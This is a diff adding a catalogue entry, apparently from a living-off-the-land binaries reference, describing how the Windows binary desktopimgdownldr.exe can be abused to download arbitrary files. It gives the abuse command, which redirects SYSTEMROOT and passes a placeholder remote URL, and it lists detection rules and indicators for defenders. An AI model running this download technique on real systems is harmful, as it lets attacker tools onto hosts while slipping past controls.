@@ -1,0 +1,63 @@
+---
+Acknowledgement:
+- Person: Gal Kris
+Author: Gal Kristal
+Commands:
+- Category: Download
+  Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL}
+    /eventName:desktopimgdownldr
+  Description: Downloads the file and sets it as the computer's lockscreen
+  MitreID: T1105
+  OperatingSystem: Windows 10, Windows 11
+  Privileges: User
+  Usecase: Download arbitrary files from a web server
+Created: 2020-06-28
+Description: Windows binary used to configure lockscreen/desktop image
+Detection:
+- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_desktopimgdownldr_susp_execution.yml
+- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/file/file_event/file_event_win_susp_desktopimgdownldr_file.yml
+- Elastic: https://github.com/elastic/detection-rules/blob/82ec6ac1eeb62a1383792719a1943b551264ed16/rules/windows/command_and_control_remote_file_copy_desktopimgdownldr.toml
+- IOC: desktopimgdownldr.exe that creates non-image file
+- IOC: Change of HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\PersonalizationCSP\LockScreenImageUrl
+Full_Path:
+- Path: c:\windows\system32\desktopimgdownldr.exe
+Name: Desktopimgdownldr.exe
+Resources:
+- Link: https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
+mitre_data:
+  technique_ids:
+  - T1105
+tags:
+- lolbas/osbinaries
+---
+
+# Desktopimgdownldr.exe
+
+Windows binary used to configure lockscreen/desktop image
+
+# Path(s)
+
+- `c:\windows\system32\desktopimgdownldr.exe`
+
+# Download Commands
+
+Downloads the file and sets it as the computer's lockscreen
+
+```batch
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:{REMOTEURL} /eventName:desktopimgdownldr
+```
+
+- **Usecase:** Download arbitrary files from a web server
+- **Privileges Required:** User
+- **MitreID:** `T1105`
+- **Operating System(s):** Windows 10, Windows 11
+
+
+
+# Resource(s)
+
+- https://labs.sentinelone.com/living-off-windows-land-a-new-native-file-downldr/
+# Acknowledgements
+
+- Gal Kristal (Authored, 2020-06-28)
+- Gal Kris
